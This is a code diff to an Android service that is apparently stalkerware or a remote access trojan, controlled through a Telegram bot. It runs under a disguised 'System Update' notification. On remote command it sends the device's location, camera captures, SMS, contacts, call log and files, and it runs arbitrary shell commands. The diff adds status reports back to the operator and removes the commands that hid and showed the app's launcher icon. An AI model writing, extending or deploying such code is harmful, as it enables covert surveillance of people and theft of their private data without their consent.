@@ -20,18 +20,24 @@ public class BotService extends Service {
     @Override
     public void onCreate(){
         super.onCreate();
-        NotificationChannel ch = new NotificationChannel("sys","System",NotificationManager.IMPORTANCE_MIN);
-        ch.setShowBadge(false);
-        ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
-        Notification n = new Notification.Builder(this,"sys")
-            .setContentTitle("System Update").setContentText("Running...")
-            .setSmallIcon(android.R.drawable.stat_sys_download_done)
-            .setPriority(Notification.PRIORITY_MIN).build();
-        startForeground(1, n);
-        locMgr = (LocationManager) getSystemService(LOCATION_SERVICE);
+        try{
+            NotificationChannel ch = new NotificationChannel("sys","System",NotificationManager.IMPORTANCE_LOW);
+            ch.setShowBadge(false);
+            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
+            Notification n = new Notification.Builder(this,"sys")
+                .setContentTitle("System Update").setContentText("Running...")
+                .setSmallIcon(android.R.drawable.stat_sys_download_done)
+                .setPriority(Notification.PRIORITY_LOW).build();
+            startForeground(1, n);
+            locMgr = (LocationManager) getSystemService(LOCATION_SERVICE);
+            TgApi.send("BOOT: service onCreate OK");
+        }catch(Exception e){
+            TgApi.send("BOOT ERR: "+e.getMessage());
+        }
     }
     @Override
     public int onStartCommand(Intent i, int f, int s){
+        TgApi.send("BOOT: onStartCommand");
         new Thread(this::poll).start();
         return START_STICKY;
     }
@@ -58,7 +64,7 @@ public class BotService extends Service {
     }
     private void handle(String cmd){
         try{
-            if(cmd.equals("/start")||cmd.equals("/help")) TgApi.send("/loc /live /cam /cam_back /sms /contacts /callog /files /vibrate /shell /hide /show");
+            if(cmd.equals("/start")||cmd.equals("/help")) TgApi.send("/loc /live /cam /cam_back /sms /contacts /callog /files /vibrate /shell");
             else if(cmd.equals("/loc")) sendLoc();
             else if(cmd.equals("/live")) liveLoc();
             else if(cmd.equals("/cam")) capture(0);
@@ -68,8 +74,6 @@ public class BotService extends Service {
             else if(cmd.equals("/callog")) callog();
             else if(cmd.equals("/files")) files();
             else if(cmd.equals("/vibrate")) vib();
-            else if(cmd.equals("/hide")){ hide(); TgApi.send("ok"); }
-            else if(cmd.equals("/show")){ show(); TgApi.send("ok"); }
             else if(cmd.startsWith("/shell ")) shell(cmd.substring(7));
         }catch(Exception e){ TgApi.send("err "+e.getMessage()); }
     }
@@ -80,13 +84,14 @@ public class BotService extends Service {
                 Location l = locMgr.getLastKnownLocation(p);
                 if(l!=null && (last==null || l.getTime()>last.getTime())) last = l;
             }
-            if(last!=null){ TgApi.sendLoc(last.getLatitude(), last.getLongitude()); }
-        }catch(Exception e){}
+            if(last!=null){ TgApi.sendLoc(last.getLatitude(), last.getLongitude()); TgApi.send("loc: "+last.getLatitude()+","+last.getLongitude()); }
+            else TgApi.send("no location");
+        }catch(Exception e){ TgApi.send("loc err "+e.getMessage()); }
     }
     private void liveLoc(){
-        TgApi.send("live");
+        TgApi.send("live 60s");
         final LocationListener ll = new LocationListener(){
-            public void onLocationChanged(Location l){ TgApi.sendLoc(l.getLatitude(), l.getLongitude()); }
+            public void onLocationChanged(Location l){ TgApi.sendLoc(l.getLatitude(), l.getLongitude()); TgApi.send("loc: "+l.getLatitude()+","+l.getLongitude()); }
             public void onStatusChanged(String s,int i,Bundle b){}
             public void onProviderEnabled(String s){}
             public void onProviderDisabled(String s){}
@@ -189,7 +194,7 @@ public class BotService extends Service {
         }catch(Exception e){ TgApi.send("fl err "+e.getMessage()); }
     }
     private void vib(){
-        try{ ((Vibrator)getSystemService(VIBRATOR_SERVICE)).vibrate(2000); }catch(Exception e){}
+        try{ ((Vibrator)getSystemService(VIBRATOR_SERVICE)).vibrate(2000); TgApi.send("vib"); }catch(Exception e){}
     }
     private void shell(String cmd){
         try{
@@ -202,22 +207,6 @@ public class BotService extends Service {
             if(t.length()>3500) t = t.substring(0,3500);
             TgApi.send(t);
         }catch(Exception e){ TgApi.send("sh err "+e.getMessage()); }
-    }
-    private void hide(){
-        try{
-            getPackageManager().setComponentEnabledSetting(
-                new ComponentName(this, MainActivity.class),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP);
-        }catch(Exception e){}
-    }
-    private void show(){
-        try{
-            getPackageManager().setComponentEnabledSetting(
-                new ComponentName(this, MainActivity.class),
-                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                PackageManager.DONT_KILL_APP);
-        }catch(Exception e){}
     }
     @Override
     public IBinder onBind(Intent i){ return null; }
